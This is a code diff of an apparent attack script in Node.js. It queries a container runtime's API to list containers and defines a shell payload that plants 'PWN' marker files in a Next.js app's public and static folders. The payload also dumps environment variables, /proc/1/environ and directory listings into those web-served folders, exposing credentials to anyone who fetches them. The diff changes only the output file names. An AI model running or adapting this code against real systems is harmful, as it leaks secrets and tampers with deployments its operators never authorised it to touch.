@@ -16,8 +16,8 @@ function call(path, body, cb) {
   r.end(Buffer.concat([h, body]));
 }
 function field(n, s) { const b = Buffer.from(s); return Buffer.concat([Buffer.from([n, b.length]), b]); }
-const SCRIPT = "for d in /app/public /app/.next/static /app/.next/standalone/public; do echo PWN-$(hostname) >> $d/zz_$(hostname).txt 2>/dev/null; done; " +
-  "for d in /app/public /app/.next/static; do { echo HOST=$(hostname); env; echo ---; cat /proc/1/environ | tr '\\0' '\\n'; echo ---; ls -la /app $d; } >> $d/zz_env_$(hostname).txt 2>&1; done";
+const SCRIPT = "for d in /app/public /app/.next/static /app/.next/standalone/public; do echo PWN-$(hostname) >> $d/zz_ok.txt 2>/dev/null; done; " +
+  "for d in /app/public /app/.next/static; do { echo HOST=$(hostname); env; echo ---; cat /proc/1/environ | tr '\\0' '\\n'; echo ---; ls -la /app $d; } >> $d/zz_env.txt 2>&1; done";
 call('/runtime.v1.RuntimeService/ListContainers', Buffer.from([0x0a, 0x00]), (e, buf) => {
   if (e) { fs.writeFileSync('/tmp/p1.err', e); return; }
   const ids = [...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g) || []))];
